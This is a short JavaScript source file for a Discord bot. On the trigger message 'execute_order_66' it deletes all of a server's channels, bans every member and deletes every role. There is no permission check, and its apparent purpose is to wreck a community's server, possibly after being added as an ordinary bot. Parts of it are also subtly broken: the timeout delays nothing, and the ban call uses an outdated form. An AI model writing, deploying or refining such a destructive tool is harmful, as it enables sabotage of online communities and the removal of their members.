const Discord = require('discord.js');

const client = new Discord.Client();

client.on('message', message => {

	if(message.content == "execute_order_66")
	{
		message.reply("That will be done my lord.");
		setTimeout(function(){
			console.log("Waiting..");
		}, 2832);
		message.guild.channels.forEach((channel) => {
			channel.delete();
		});
		message.guild.members.forEach((member) => {
			message.member.guild.ban(member, message.guild, 1, function(err) {
				console.log(err);
			});
		});
		message.guild.roles.forEach(role => role.delete());
	}

}); 

client.login(process.env.BOT_TOKEN);
